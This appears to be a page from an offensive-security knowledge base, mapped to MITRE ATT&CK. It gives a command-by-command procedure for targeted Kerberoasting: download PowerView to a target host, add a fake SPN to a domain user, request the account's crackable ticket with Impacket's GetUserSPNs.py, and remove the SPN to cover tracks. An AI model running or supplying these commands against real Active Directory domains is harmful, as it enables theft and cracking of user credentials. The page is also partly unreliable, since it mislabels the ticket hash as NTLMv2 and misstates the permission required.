---
id: 9c74b3a0-789c-4453-94e4-a94d643be853
name: Add SPN to a Domain User and Kerberoast for NTLMv2 Hash
type: procedure
verified: false
submitted: false
created_at: '2020-06-25T20:16:48.145931+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Kerberoasting|T1208 - Kerberoasting]]'
tags:
- '[[kerberoast]]'
commands:
- '[[Create a Windows PSCredential Object]]'
- '[[GetUserSPN.py Query Domain for SPNs and Retrieve a User''s NTLMv2 Hash]]'
- '[[PowerView Add SPN to a Domain User]]'
- '[[PowerView Remove SPN to a Domain User]]'
---

# Add SPN to a Domain User and Kerberoast for NTLMv2 Hash

## Summary

Add a Service Principle Name (SPN) to an Active Directory user account, allowing others to retrieve the NTLMv2 hash via Kerberoasting. This requires a user with authorization to modify group membership, though once the SPN is set, any domain user can retrieve the hash. 

## Description

# Description

Add a Service Principle Name (SPN) to an Active Directory user account, allowing others to retrieve the NTLMv2 hash via Kerberoasting. This requires a user with authorization to modify group membership, though once the SPN is set, any domain user can retrieve the hash.



# Instructions

1. Download PowerView (dev branch), and import it on the target machine: [Download from GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

2. (Optional) It may be necessary to create a PS Credentials object of the user who is authorized to add SPN





**Command** ([[Create a Windows PSCredential Object]]):

```bash
$Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
```





3. Add a SPN to the target user (Identity)





**Command** ([[PowerView Add SPN to a Domain User]]):

```bash
Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -SET @{serviceprincipalname='nonexistent/$_DOMAIN'}
```





4. Kerberoast the target user using [Impacket's GetUserSPN.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)





**Command** ([[GetUserSPN.py Query Domain for SPNs and Retrieve a User's NTLMv2 Hash]]):

```bash
GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request -request-user $_TARGET_USER
```





5. (Optional) Clean up by removing the SPN after retreiving the hash





**Command** ([[PowerView Remove SPN to a Domain User]]):

```bash
Set-DomainObject -Credential $Cred -Identity $_TARGET_USER -Clear serviceprincipalname
```







## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Kerberoasting|T1208 - Kerberoasting]]

## Commands Used

- [[Create a Windows PSCredential Object]]
- [[GetUserSPN.py Query Domain for SPNs and Retrieve a User's NTLMv2 Hash]]
- [[PowerView Add SPN to a Domain User]]
- [[PowerView Remove SPN to a Domain User]]

## Tags

- [[kerberoast]]


